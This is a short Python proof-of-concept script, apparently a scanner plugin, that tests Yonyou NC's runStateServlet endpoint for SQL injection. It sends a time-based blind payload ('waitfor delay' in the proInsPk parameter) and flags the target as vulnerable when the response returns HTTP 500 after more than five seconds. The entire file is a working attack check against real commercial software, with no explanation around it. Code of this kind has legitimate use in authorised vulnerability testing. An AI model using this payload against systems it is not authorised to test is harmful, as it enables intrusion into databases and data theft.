import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-runStateServlet接口存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    vurl = urllib.parse.urljoin(url, "/portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:5'--")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult